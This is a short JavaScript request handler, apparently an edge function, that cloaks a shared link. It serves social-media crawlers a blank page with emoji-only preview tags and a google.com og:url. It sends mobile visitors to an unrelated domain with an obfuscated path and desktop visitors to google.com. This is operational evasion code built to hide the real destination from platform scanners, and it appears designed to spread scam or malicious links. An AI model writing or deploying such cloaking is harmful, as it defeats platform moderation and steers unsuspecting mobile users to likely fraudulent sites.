export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="😍🎧🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Sat-Sep-12-2026/95a27bcd-dd74-40d7-a3b0-ceb44816f0dd/94970281-92a2-4891-87ef-430074375885.avif">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://racialburgerdiverse.com/a1lWr/gvHRHF4VS-HfY0BlAEy/3CZTEpjCf_Jt1Bl/Z6N8Dip/XD85kx-oFLqAisy_yA/l9A/CqH4F9Bdk7WV-kLkms/VDq6GjAZyP_53L/BAwWskmp-9/JhU84XvymOrTuRZ/x9nE", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
